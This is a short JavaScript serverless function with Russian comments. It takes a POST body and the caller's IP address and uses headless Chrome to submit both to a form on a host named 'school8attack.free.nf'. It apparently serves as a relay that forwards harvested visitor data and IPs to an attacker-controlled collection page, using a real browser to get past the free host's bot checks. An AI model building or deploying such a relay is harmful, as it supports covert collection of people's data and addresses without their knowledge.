const puppeteer = require('puppeteer-core');
const chrome = require('chrome-aws-lambda'); // для работы в Vercel serverless

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.status(405).send('Only POST allowed');
    return;
  }

  const data = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  if (!data) {
    res.status(400).send('Data field missing');
    return;
  }

  const targetUrl = 'https://school8attack.free.nf'; // <-- ТУТ УКАЖИ свой URL на PHP страницу

  const browser = await puppeteer.launch({
    args: chrome.args,
    executablePath: await chrome.executablePath,
    headless: true,
  });
  const page = await browser.newPage();
  try {
    await page.goto(targetUrl, { waitUntil: 'networkidle2' });

    await page.type('#ip', ip);
    await page.type('#data', data);
    await page.click('#submit');

    await page.waitForTimeout(2000); // подожди пару секунд чтобы отправка точно прошла
    await browser.close();

    res.status(200).send('Data submitted successfully');
  } catch (error) {
    console.error(error);
    await browser.close();
    res.status(500).send('Error submitting data');
  }
};
